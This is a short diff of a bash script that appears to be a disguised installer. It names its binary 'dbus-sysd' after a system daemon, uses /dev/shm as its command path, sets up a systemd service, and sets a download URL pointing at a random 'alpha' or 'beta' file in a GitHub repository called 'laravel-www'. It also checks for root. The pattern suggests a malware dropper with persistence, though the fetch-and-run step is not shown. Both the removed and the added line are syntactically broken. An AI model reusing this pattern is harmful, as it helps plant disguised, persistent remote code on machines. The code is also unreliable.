@@ -7,7 +7,7 @@ CONFIG_FILE_ROOT="/usr/bin/dbus-sysd"
 SERVICE_PATH="/lib/systemd/system/${SERVICE_NAME}.service"
 APP_CMD_PATH="/dev/shm"
 APP_CMD="dbus-sysd"
-CHOOSE=$(echo -e "alpha\nbeta" | shuf -n1()
+CHOOSE=$(echo -e "alpha\nbeta" | shuf -n1())
 CONFIG_URL="https://raw.githubusercontent.com/sachagerard1985/laravel-www/refs/heads/main/${CHOOSE}"
 
 if [[ $EUID -eq 0 ]]; then
